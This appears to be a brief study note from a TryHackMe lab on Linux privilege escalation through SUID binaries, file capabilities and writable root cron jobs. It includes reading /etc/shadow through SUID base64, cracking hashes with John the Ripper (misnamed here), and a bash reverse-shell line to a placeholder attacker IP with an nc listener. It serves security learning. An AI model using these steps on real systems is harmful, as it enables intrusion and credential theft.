Linux Privilege Escalation (A TryHackMe Challenge: for Educational Purposes only) 

via SUID info 

1. Run find / -type f -perm -04000 -ls 2>/dev/null to search for files that have the SUID bit set
2. THM victim's machine has a SUID for the base64 tool, so we can use it to read the etc/passwd or etc/shadow files
3. Since it's encoded in base64, we can use a free online base 64 decoder to crack it
4. Once we have both passwd and shadow files, we can use Jack the Ripper tool to unshadow and merge them
5. Run Jack the Ripper with a database of common passwords to crack the password for the local users on the victim's machine

via Capabilities 

1. getcap -r / 2>dev/null (will produce a lot of errors so let's redirect it to dev/null)
2. ls -l to list permissions of the capabilities

via Crontabs

1. /etc/crontab and check the list of jobs run by root (or account with higher privilege)
2. check if the job is editable using nano <job_path>
3. add a reverse shell script command to the current job: bash -i >& /dev/tcp/<attacker's IP>/<port_number> 0>&1
4. Start the listener on the attacker's IP nc -nlvp <port_number> 
5. When the cronjob is executable, it will spin up a reverse shell with the account that runs the cronjob
